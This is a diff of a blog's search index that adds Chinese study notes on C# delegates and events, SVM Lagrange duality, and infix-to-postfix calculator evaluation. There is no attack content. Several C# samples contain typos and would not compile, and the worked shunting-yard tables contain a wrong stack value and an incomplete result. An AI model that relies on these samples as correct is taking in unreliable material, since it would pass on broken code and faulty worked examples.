+<p><a href="https://juejin.cn/post/6978804300768083976#heading-0">https://juejin.cn/post/6978804300768083976#heading-0</a></p>
+<p><a href="https://x.com/ErrataRob/status/1331750197836345345">(20) Robert Graham 𝕏 on X: “19&#x2F; …even when translating x86 code, all that reference counting overhead (already more efficient than garbage collection) gets dropped in half. Yet another weird performance enhance to add to all the others.” &#x2F; X</a></p>
+<p><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98%E6%8E%92%E5%BA%8F">内存排序 - 维基百科，自由的百科全书</a></p>
 ]]></content>
       <categories>
         <category>计算机</category>
       </categories>
       <tags>
         <tag>计算机组成与系统结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>c艹事件</title>
+    <url>/2024/12/09/c-%E4%BA%8B%E4%BB%B6/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="委托与事件"><a href="#委托与事件" class="headerlink" title="委托与事件"></a>委托与事件</h1><h2 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h2><p>实际上用类完成了函数指针的功能</p>
+<h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">Print</span>(<span class="params"><span class="built_in">int</span> x</span>)  <span class="comment">//只能在namespace和类下</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="初始化，赋值"><a href="#初始化，赋值" class="headerlink" title="初始化，赋值"></a>初始化，赋值</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Print someFunc = hello；</span><br><span class="line">Print someFunc = <span class="keyword">new</span> Print(hello); </span><br></pre></td></tr></table></figure>
+
+<h4 id="调用委托变量"><a href="#调用委托变量" class="headerlink" title="调用委托变量"></a>调用委托变量</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">someFunc(<span class="number">30</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">PrintInt</span>(<span class="params"><span class="built_in">int</span> x</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Hello</span>(<span class="params"><span class="built_in">int</span> x</span>)</span> =&gt; Console.WriteLIne(<span class="string">$&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">PrintINt writeInt = Hello(<span class="number">354</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="多播委托"><a href="#多播委托" class="headerlink" title="多播委托"></a>多播委托</h2><p>多播委托将多个函数对象分配到一个委托示例</p>
+<p>委托的分配动作是通过 +&#x3D; 、-&#x3D; 完成的（可以用&#x3D;。 事件不能用&#x3D;）</p>
+<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>事件是一种特殊的委托</p>
+<h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>事件拥有者，事件成员，事件相应者，事件处理器，事件订阅</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241209223501574.png" alt="image-20241209223501574"></p>
+<p>主流理解是将代码分为两个部分：事件发布者（广播者）和事件订阅者（订阅者）</p>
+<p>简称SB模式</p>
+<p>最大的好处是不能赋值。</p>
+<h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><ol>
+<li>在类中定义私有化委托</li>
+<li>暴露出-&#x3D;、+&#x3D;的方法</li>
+</ol>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">FuncHandler</span>(<span class="params"><span class="built_in">int</span> item</span>)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Broadcaster</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">event</span> FuncHandler funcHandler; <span class="comment">//事件的声明</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="事件的标准写法"><a href="#事件的标准写法" class="headerlink" title="事件的标准写法"></a>事件的标准写法</h3><ol>
+<li><p>命名事件的委托必须以EventHandler结尾</p>
+</li>
+<li><p>触发函数必须以On开头，且必须是虚函数</p>
+</li>
+<li><p>订阅者（+&#x3D;、-&#x3D;）函数的类型符合EventHandler委托类型</p>
+<ol>
+<li><p>接收两个参数（object arg1， SomeEventArgs arg2）</p>
+<p>​    arg1 表示广播者</p>
+<p>​    arg2 参数为EventArgs的子类 表示传播信息</p>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">MyDelegate</span>(<span class="params"><span class="built_in">string</span> str</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">event</span> MyDelegate MyEvent;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnEventHappend</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    MyEvent?.Invoke(<span class="string">&quot;happened&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Display</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">&#123;	</span><br><span class="line">    <span class="comment">//1. 定义一个事件，然后把这个事件注册到某个响应上</span></span><br><span class="line">    MyEvent += Display  <span class="comment">//会输出happened</span></span><br><span class="line">    Peoople p = <span class="keyword">new</span> People();</span><br><span class="line">    MyEvent += p.PeopleResponed;</span><br><span class="line">    OnEventHappend();<span class="comment">//事件的触发</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Animal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AnimalRespond</span>(<span class="params"><span class="built_in">string</span> s</span>)	<span class="comment">//效应</span></span></span><br><span class="line">    &#123;</span><br><span class="line">    	Console.WriteLine(<span class="string">&quot;Animal Responed&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">People</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PeopleRespond</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">    	Console.WriteLine(<span class="string">&quot;People Responed&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>c#</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>支持向量机（SVM）</title>
+    <url>/2025/10/07/SVM/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="支持向量机"><a href="#支持向量机" class="headerlink" title="支持向量机"></a>支持向量机</h1><p>[toc]</p>
+<h3 id="数学基础补充"><a href="#数学基础补充" class="headerlink" title="数学基础补充"></a>数学基础补充</h3><h4 id="二元函数的无条件极值问题"><a href="#二元函数的无条件极值问题" class="headerlink" title="二元函数的无条件极值问题"></a>二元函数的无条件极值问题</h4><ol>
+<li>求偏导等于0，找到所有驻点（必要条件）</li>
+<li>求二阶偏导，依次确定各驻点处A、B、C的值，根据$$AC-B^2$$的符号判断是否为极值点（充分条件）<ol>
+<li>大于0，有极值。A&gt;0极小值，反之极大值</li>
+<li>小于0，没有极值</li>
+<li>等于0，可能有也可能没有</li>
+</ol>
+</li>
+</ol>
+<p>这通常对应一个<strong>最简单的无约束优化问题</strong></p>
+<h4 id="条件极值和拉格朗日乘数法"><a href="#条件极值和拉格朗日乘数法" class="headerlink" title="条件极值和拉格朗日乘数法"></a>条件极值和拉格朗日乘数法</h4><p>条件极值：对自变量有附加条件的极值</p>
+<p>设二元函数$$f(x,y)$$和$$\phi(x,y)$$在区域D内有一阶连续偏导数，则求$$z &#x3D; f(x,y)$$在D内满足条件$$\phi(x,y)$$的极值问题，可以转化为求拉格朗日函数<br>$$<br>L(x,y,\lambda) &#x3D; f(x,y) + \lambda\phi(x,y)~~~~~	(其中\lambda是某一常数)<br>$$<br>的无条件极值问题</p>
+<p>其中我们称一维向量$$\lambda_i$$是一个拉格朗日乘子</p>
+<p>这通常用于<strong>求解带有等式约束的优化问题</strong></p>
+<h4 id="数学符号说明"><a href="#数学符号说明" class="headerlink" title="数学符号说明"></a>数学符号说明</h4><h5 id="最大最小"><a href="#最大最小" class="headerlink" title="最大最小"></a>最大最小</h5><p>$$<br>g(\lambda) &#x3D; max_{x \in D}f(x,\lambda)<br>$$</p>
+<ul>
+<li>这是一个关于$$\lambda$$的函数</li>
+<li>当 $$\lambda &#x3D; y$$ 时，$$g(\lambda)$$ 的取值为： 固定 $$f(x,\lambda)$$ 中的 $$\lambda &#x3D; y $$ ，变动 x 时 f 能娶到的最大值</li>
+</ul>
+<p>$$<br>g(\lambda) &#x3D; max_\lambda ~min_x ~f(x,\lambda)<br>$$</p>
+<ul>
+<li>从右往左看，首先把min这一项看作关于$$\lambda$$ 的函数$$g(\lambda)$$ ，然后求这个函数的最大值</li>
+</ul>
+<h5 id="inf和sup符号"><a href="#inf和sup符号" class="headerlink" title="inf和sup符号"></a>inf和sup符号</h5><p>inf 是下确界，sup 上确界。和最大最小值相似但不同，max f 不存在的情况下 sup f 可能存在</p>
+<h5 id="凸函数凹函数"><a href="#凸函数凹函数" class="headerlink" title="凸函数凹函数"></a>凸函数凹函数</h5><p>使用国内定义还是国际定义仁者见仁智者见智了（<strong>以下使用国际定义</strong>）</p>
+<p>但是要记得詹森不等式<br>$$<br>凸函数：和的函数值 \le 函数值的和 \<br>凹函数：和的函数值 \ge 函数值的和<br>$$<br><a href="https://wetts.github.io/2019/09/11/%E6%95%B0%E5%AD%A6/%E5%85%B6%E4%BB%96/%E4%BB%BF%E5%B0%84%E5%87%BD%E6%95%B0%E5%92%8C%E7%BA%BF%E6%80%A7%E5%87%BD%E6%95%B0/">仿射函数</a>是又凹又凸的</p>
+<p>max是凹函数、min是凸函数（利用詹森不等式证明）</p>
+<h4 id="拉格朗日对偶问题"><a href="#拉格朗日对偶问题" class="headerlink" title="拉格朗日对偶问题"></a>拉格朗日对偶问题</h4><h5 id="原问题"><a href="#原问题" class="headerlink" title="原问题"></a>原问题</h5><p>$$<br>\begin{aligned}<br>	\min_{\mathbf{x}\in \mathbb{R} ^{\mathtt{n}}} \mathbf{f}\left( \mathbf{x} \right)\<br>	\mathbf{s}.\mathbf{t}\quad \mathbf{c}<em>{\mathtt{i}}\left( \mathbf{x} \right) &amp;\leqslant \mathbf{0},\mathbf{i}\in \left[ \mathtt{1},\mathtt{k} \right]\<br>	\quad \quad \mathtt{h}</em>{\mathtt{j}}\left( \mathbf{x} \right) &amp;&#x3D;\mathbf{0},\mathbf{j}\in \left[ \mathtt{1},\mathbf{l} \right]\<br>\end{aligned}<br>$$</p>
+<p><a href="https://zh.wikipedia.org/wiki/%E5%87%B8%E5%84%AA%E5%8C%96">凸优化</a> 要求$$f(x)$$ 是凸函数， $$c_i(x)$$ 是凸函数， $$h_j(x)$$ 是仿射函数</p>
+<p>但这里我们做两个约定</p>
+<ul>
+<li>我们不假定原函数 f 的凹凸性， f 既可以是凹函数也可以是凸函数</li>
+<li>问题的定义域 $$\mathrm{D}&#x3D;(\mathrm{dom} \mathrm{f)}\cap (\bigcap\nolimits_{\mathrm{i}&#x3D;1}^{\mathrm{k}}{\mathrm{c}<em>{\mathrm{i}})}\cap (\bigcap\nolimits</em>{\mathrm{i}&#x3D;1}^{\mathrm{l}}{\mathrm{h}_{\mathrm{i}})}$$</li>
+<li>D 不是 空集</li>
+<li>我们约定最终求出来的最优结果用$$p^*$$表示</li>
+</ul>
+<h5 id="对偶问题"><a href="#对偶问题" class="headerlink" title="对偶问题"></a>对偶问题</h5><p>定义：实质相同但从不同角度提出不同提法的一对问题。</p>
+<p>在原问题中, 约束条件太多，并且凹凸性不明确。 于是我们将他转化为拉格朗日对偶问题。这样的有点是：只有一个约束，并且拉格朗日对偶问题一定是凹的。</p>
+<p>证明如下：</p>
+<ol>
+<li>类比于等式约束的最值问题，我们为原问题构建一个广义拉格朗日函数</li>
+</ol>
+<p>$$<br>\begin{aligned}<br>	\mathcal{L} :\mathbb{R} ^{\mathtt{n}}\times \mathbb{R} ^{\Bbbk}\times \mathbb{R} ^{\mathrm{l}}\rightarrow \mathrm{R}\<br>	\mathcal{L} (\mathtt{x},\mathrm{\lambda},\mathrm{\mu)}&amp;&#x3D;\mathtt{f}(\mathtt{x})+\sum_{\mathrm{i}&#x3D;1}^{\mathrm{k}}{\lambda <em>{\mathrm{i}}\mathrm{c}</em>{\mathrm{i}}(\mathtt{x})}+\sum_{\mathrm{j}&#x3D;1}^{\mathrm{l}}{\mathrm{\mu}<em>{\mathrm{j}}\mathrm{h}</em>{\mathrm{j}}(\mathtt{x})}\<br>	\vec{\mathtt{x}}\in \mathbb{R} ^{\mathtt{n}},\vec{\lambda}\in \mathbb{R} ^{\Bbbk},\vec{\mathrm{\mu}}\in \mathbb{R} ^{\mathrm{l}}\<br>\end{aligned}<br>$$</p>
+<ol start="2">
+<li>根据 L 我们定义一个拉格朗日对偶函数 g(lambda, mu)</li>
+</ol>
+<p>$$<br>\begin{aligned}<br>	\mathtt{g}(\mathrm{\lambda},\mathrm{\mu)}&amp;&#x3D;\mathop {\mathrm{inf}} \limits_{\mathtt{x}\in \mathrm{D}}\mathcal{L} (\mathtt{x},\mathrm{\lambda},\mathrm{\mu)}\<br>	&amp;&#x3D;\mathop {\mathrm{inf}} \limits_{\mathtt{x}\in \mathrm{D}}\bigl( \mathtt{f}(\mathtt{x})+\sum_{\mathtt{i}&#x3D;\mathtt{l}}^{\mathtt{k}}{\lambda <em>{\mathtt{i}}\mathrm{c}</em>{\mathtt{i}}(\mathtt{x})}+\sum_{\mathtt{j}&#x3D;\mathtt{l}}^{\mathtt{l}}{\mathrm{\mu}<em>{\mathtt{j}}\mathrm{h}</em>{\mathtt{j}}(\mathtt{x})} \bigr)\<br>	\lambda &amp;\geqslant 0\<br>\end{aligned}<br>$$</p>
+<p>​	可以证明这个函数一定是凹函数。</p>
+<p>我们总结得到：<strong>不管原函数 f 的凹凸性， 它的对偶函数 g 一定是凹函数</strong></p>
+<p>我们之所以需要这么一个对偶函数是因为<strong>只要 λ 不小于 0 ， g的值永远不会超过 $$p^*$$</strong>。证明略</p>
+<p>也就是说， $$p^*$$永远都不会小于 $$max~g(\lambda,\mu)$$</p>
+<h5 id="从原问题到拉格朗日对偶问题"><a href="#从原问题到拉格朗日对偶问题" class="headerlink" title="从原问题到拉格朗日对偶问题"></a>从原问题到拉格朗日对偶问题</h5><p>我们通过拉格朗日对偶函数给出了最优解 $$p^<em>$$的下界，也就是说我们通过求$$max~g(\lambda,\mu)$$来逼近$$p^</em>$$的值</p>
+<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage2@main/999097456ceba220cd75ceae4f92041c.png" alt="在这里插入图片描述" style="zoom: 50%;">
+
+<p>回顾原问题，我们现在给出对偶问题的形式<br>$$<br>\begin{aligned}<br>	\max_{\lambda ,\mu} \mathtt{g}(\lambda ,\mu )&amp;&#x3D;\max_{\lambda ,\mu} \mathop {\mathrm{inf}} \limits_{\mathtt{x}\in \mathrm{D}}\mathcal{L} (\mathtt{x},\lambda ,\mu )\<br>	\mathrm{s}.\mathrm{t}\quad \lambda _{\mathtt{i}}&amp;\geqslant \mathtt{0},\mathtt{i}&#x3D;\mathtt{1},\mathtt{2},…,\mathtt{k}\<br>\end{aligned}<br>$$<br>这是个凸优化问题，我们转而去求 d^* 了。</p>
+<h4 id="KKT条件"><a href="#KKT条件" class="headerlink" title="KKT条件"></a>KKT条件</h4><p>学习中……</p>
+<h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><h4 id="超平面"><a href="#超平面" class="headerlink" title="超平面"></a>超平面</h4><p>二维空间上，两类点被一条直线完全分开叫做线性可分</p>
+<p>拓展到n维空间上，将n维欧氏空间上的两个点集$$D_1$$ 和$$D_2$$完全正确地划分开的 $$wx + b &#x3D; 0$$就成了一个超平面。</p>
+<h4 id="支持向量"><a href="#支持向量" class="headerlink" title="支持向量"></a>支持向量</h4><p>样本中距离超平面最近的一些点叫做支持向量</p>
+<p><img src="https://picx.zhimg.com/v2-0f1ccaf844905148b7e75cab0d0ee2e3_1440w.jpg" alt="img"></p>
+<h3 id="SVM最优化问题"><a href="#SVM最优化问题" class="headerlink" title="SVM最优化问题"></a>SVM最优化问题</h3><p>SVM想要找到的就是 最大间隔超平面，即支持向量离超平面最远</p>
+<p>任意超平面可以用以下线性方程来描述：<br>$$<br>w^T x + b &#x3D; 0<br>$$<br>由点到直线的距离公式推导可得，n维向量到超平面的距离为：<br>$$<br>\frac{|w^T x + b &#x3D; 0|}{||w||}<br>$$<br>其中 $$||w||$$ &#x3D; $$\sqrt{w_1^2+…+w_n^2}$$</p>
+<p>我们假设支持向量到超平面的距离为 d，可知其他向量到超平面的距离 &gt; d，于是我们可以这样描述超平面两端的向量：<br>$$<br>\left{ \begin{aligned}<br>	\frac{\boldsymbol{w}^T\boldsymbol{x}+\boldsymbol{b}}{||\boldsymbol{w}||}&amp;\ge \boldsymbol{d}\quad \boldsymbol{y}&#x3D;\boldsymbol{1}\<br>	\frac{\boldsymbol{w}^T\boldsymbol{x}+\boldsymbol{b}}{||\boldsymbol{w}||}&amp;\le -\boldsymbol{d}\quad \boldsymbol{y}&#x3D;-\boldsymbol{1}\<br>\end{aligned} \right.<br>$$<br>由于 $$||w||d$$ 严格大于0，我们假设它为 1 </p>
+<h2 id="sklearn实现SVM"><a href="#sklearn实现SVM" class="headerlink" title="sklearn实现SVM"></a>sklearn实现SVM</h2>]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>机器学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算器原理</title>
+    <url>/2024/11/05/c-%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E5%99%A8/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="计算器原理"><a href="#计算器原理" class="headerlink" title="计算器原理"></a>计算器原理</h1><p>计算器计算的表达式是后缀表达式。</p>
+<p>我们输入一个表达式，计算器给出结果主要经过了：将中缀表达式转化为后缀表达式，计算后缀表达式这两个过程</p>
+<p>而转化和计算过程运用到了数据结构“栈”。</p>
+<p>我们为了简化过程，在转化后缀表达式过程中进行中间结果的计算。</p>
+<h3 id="中缀表达式"><a href="#中缀表达式" class="headerlink" title="中缀表达式"></a>中缀表达式</h3><blockquote>
+<p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E7%BC%80%E8%A1%A8%E7%A4%BA%E6%B3%95">中缀表示法 - 维基百科，自由的百科全书</a></p>
+</blockquote>
+<p>中缀表达法是自然语言的写法，其操作符在操作数的中间</p>
+<p>如3+4</p>
+<h3 id="后缀表达式（逆波兰表示法）"><a href="#后缀表达式（逆波兰表示法）" class="headerlink" title="后缀表达式（逆波兰表示法）"></a>后缀表达式（逆波兰表示法）</h3><blockquote>
+<p><a href="https://zh.wikipedia.org/wiki/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E7%A4%BA%E6%B3%95">逆波兰表示法 - 维基百科，自由的百科全书</a></p>
+</blockquote>
+<p>即所有操作符在操作数的后面。</p>
+<h5 id="求值过程"><a href="#求值过程" class="headerlink" title="求值过程"></a>求值过程</h5><ol>
+<li>从左到右扫描表达式</li>
+<li>遇到数字时，将数字压入堆栈</li>
+<li>遇到运算符时<ul>
+<li>弹出栈顶的两个数（栈顶和次顶），用运算符对它们做对应的计算，并将结果入栈</li>
+<li>计算顺序是： 后弹出来的  （运算符）  先弹出来的</li>
+</ul>
+</li>
+</ol>
+<h3 id="调度场算法"><a href="#调度场算法" class="headerlink" title="调度场算法"></a>调度场算法</h3><blockquote>
+<p><a href="https://zh.wikipedia.org/wiki/%E8%B0%83%E5%BA%A6%E5%9C%BA%E7%AE%97%E6%B3%95">调度场算法 - 维基百科，自由的百科全书</a></p>
+</blockquote>
+<p>将中缀表达式转化为后缀表达式的算法。</p>
+<p>为了方便快速计算，我们使用两个栈：运算符栈s1和操作数栈s2。操作数栈其实也可以看作中间结果栈。</p>
+<p>在操作数压栈过程中，直接入栈即可。</p>
+<p>在运算符压栈过程中，需要保持栈顶运算符为当前优先级最高的。换言之就是比当前栈内运算符优先级高的运算符已经完成了运算操作。</p>
+<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2368409-20211208192029096-52314956.png" alt="img" style="zoom:67%;">
+
+<h5 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h5><ol>
+<li><p>初始化两个栈：</p>
+<ul>
+<li>运算符栈：s1</li>
+<li>中间结果栈：s2</li>
+</ul>
+</li>
+<li><p>从左到右扫描中缀表达式</p>
+</li>
+<li><p>遇到操作数时，将其压入s2</p>
+</li>
+<li><p>遇到运算符时</p>
+<ul>
+<li>比较它和s1栈顶运算符的优先级：<ul>
+<li>如果s1为空或者栈顶运算符符号为（，则将其压入符号栈s1</li>
+<li>如果优先级比栈顶运算符高，也将其压入符号栈s1</li>
+<li>如果优先级比栈顶运算符低或相等，将s1栈顶的运算符弹出，并压入到s2中。</li>
+</ul>
+</li>
+<li>再重复比较它和新栈顶运算符的优先级。</li>
+</ul>
+<blockquote>
+<p>[!NOTE]</p>
+<p>重复的含义：</p>
+<ol>
+<li><p>如果s1栈顶元素符号优先级比当前符号高或者等于，那么就将其弹出压入s2中（循环做，只要s1不为空）。</p>
+<p>如果栈顶符号为 （ ，其优先级最低，就不会弹出，就跳出循环了。</p>
+</li>
+<li><p>跳出循环后，则将当前符号压入s1</p>
+</li>
+</ol>
+</blockquote>
+</li>
+<li><p>遇到括号时：</p>
+<ul>
+<li>如果是左括号（ ：则直接压入s1</li>
+<li>如果是右括号  ）：则以此弹出s1栈顶的运算符，并压入s2，知道遇到左括号为止，此时将这一对括号丢弃。</li>
+</ul>
+</li>
+<li><p>重复步骤2~5，直到表达式最右端。</p>
+</li>
+<li><p>将s1中的运算符以此弹出并压入 s2。</p>
+</li>
+<li><p>以此弹出 s2 中的元素并输出，结果的 逆序 即为：中缀表达式转为后缀表达式。</p>
+</li>
+</ol>
+<h5 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1+((2+3)*4)-5	</span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th align="center">扫描到的元素</th>
+<th align="center">s2(栈底-&gt;栈顶)</th>
+<th align="center">s1(栈底-&gt;栈顶)</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">4</td>
+<td align="center">空</td>
+<td align="center">遇到操作数，压入s2</td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td align="center">1</td>
+<td align="center">+</td>
+<td align="center">s1栈为空，压入s1</td>
+</tr>
+<tr>
+<td align="center">（</td>
+<td align="center">1</td>
+<td align="center">+（</td>
+<td align="center">左括号，压入s1</td>
+</tr>
+<tr>
+<td align="center">（</td>
+<td align="center">1</td>
+<td align="center">+（（</td>
+<td align="center">左括号，压入s1</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">1 2</td>
+<td align="center">+（（</td>
+<td align="center">遇到操作数，压入s2</td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td align="center">1 2</td>
+<td align="center">+（（+</td>
+<td align="center">栈顶为（，压入s2</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">1 2 3</td>
+<td align="center">+（（+</td>
+<td align="center">遇到操作数，压入s2</td>
+</tr>
+<tr>
+<td align="center">）</td>
+<td align="center">1 2 3 +</td>
+<td align="center">+（</td>
+<td align="center">遇到右括号，弹出+后遇到左括号，删除一对小括号</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td align="center">1 2 3 +</td>
+<td align="center">+（*</td>
+<td align="center">遇到操作符，压入s1</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">1 2 3 + 4</td>
+<td align="center">+（*</td>
+<td align="center">遇到操作数，压入s2</td>
+</tr>
+<tr>
+<td align="center">）</td>
+<td align="center">1 2 3 + 4 *</td>
+<td align="center">+</td>
+<td align="center">遇到右括号，弹出*后遇到左括号，删除一对小括号</td>
+</tr>
+<tr>
+<td align="center">-</td>
+<td align="center">1 2 3 + 4 * +</td>
+<td align="center">-</td>
+<td align="center">遇到操作符，优先级相等，弹出+后s1为空，此时将-压入 s1</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">1 2 3 + 4 * + 5</td>
+<td align="center">-</td>
+<td align="center">遇到操作数，压入s2</td>
+</tr>
+<tr>
+<td align="center">null</td>
+<td align="center">1 2 3 + 4 * + 5 -</td>
+<td align="center">空</td>
+<td align="center">解析完毕，弹出s1中符号并压入s2中</td>
+</tr>
+</tbody></table>
+<p>结果：1 2 3 + 4 * + 5</p>
+<p>这是理论上转化后缀码的步骤。</p>
+<p>优化后的程序为</p>
+<table>
+<thead>
+<tr>
+<th align="center">扫描到的元素</th>
+<th align="center">s2(栈底-&gt;栈顶)</th>
+<th align="center">s1（栈底-&gt;栈顶）</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">4</td>
+<td align="center">空</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td align="center">1</td>
+<td align="center">+</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">（</td>
+<td align="center">1</td>
+<td align="center">+（（</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">1 2</td>
+<td align="center">+（（</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td align="center">1 2</td>
+<td align="center">+（（+</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">1 2 3</td>
+<td align="center">+（（+</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">）</td>
+<td align="center">1 5</td>
+<td align="center">+（</td>
+<td align="center">将+压入s1，消除小括号，s2计算3 + 2</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td align="center">1 5</td>
+<td align="center">+（*</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">1 5 4</td>
+<td align="center">+（*</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">）</td>
+<td align="center">1 20</td>
+<td align="center">+</td>
+<td align="center">将*压入s1，消除小括号，是、s2计算 4 * 5</td>
+</tr>
+<tr>
+<td align="center">-</td>
+<td align="center">21</td>
+<td align="center">-</td>
+<td align="center">将+压入s2，计算20+1</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">21 5</td>
+<td align="center">-</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">null</td>
+<td align="center">16</td>
+<td align="center"></td>
+<td align="center">将s1弹栈，压入s2</td>
+</tr>
+</tbody></table>
+<p>结果为16</p>
+<p>这个讲数据结构的笔记挺好的： <a href="https://zq99299.github.io/dsalg-tutorial/">数据结构与算法 系列教程（笔记）</a></p>
+]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
       </tags>
   </entry>
   <entry>
@@ -1005,45 +1113,12 @@
       </tags>
   </entry>
   <entry>
-    <title>苹果的罗塞塔石碑 —— Rosetta 2</title>
-    <url>/2024/11/09/Rosetta/</url>
